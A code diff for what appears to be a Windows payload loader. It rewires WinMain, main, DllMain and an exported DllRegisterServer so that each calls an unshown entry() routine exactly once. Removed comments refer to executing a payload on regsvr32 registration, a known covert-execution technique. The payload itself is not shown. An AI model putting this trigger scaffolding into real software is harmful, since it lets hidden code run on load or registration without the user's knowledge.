@@ -151,22 +151,25 @@ VOID entry(void)
 	return;
 }
 
-#if _DEBUG
-
-int main()
+#if _RELEASE
+int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
 {
 	entry();
 	return 0;
 }
 
-#elif _WINDLL
+#elif _DEBUG && _WINDLL
+static BOOL entry_called = FALSE;
+
 BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
 {
 	switch (ul_reason_for_call)
 	{
 	case DLL_PROCESS_ATTACH:
-		entry();
-		break;
+		if (!entry_called) {
+			entry();
+			entry_called = TRUE;
+		}
 	case DLL_THREAD_ATTACH:
 	case DLL_THREAD_DETACH:
 	case DLL_PROCESS_DETACH:
@@ -175,24 +178,27 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
 	return TRUE;
 }
 
-// Export functions for DLL registration (required for regsvr32)
 extern "C" __declspec(dllexport) HRESULT DllRegisterServer(void)
 {
-	// Execute payload on registration
-	entry();
+	if (!entry_called) {
+		entry();
+		entry_called = TRUE;
+	}
 	return S_OK;
 }
 
 extern "C" __declspec(dllexport) HRESULT DllUnregisterServer(void)
 {
-	// Optionally execute on unregistration
 	return S_OK;
 }
 
 #else
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
+
+int main()
 {
 	entry();
 	return 0;
 }
+
+
 #endif
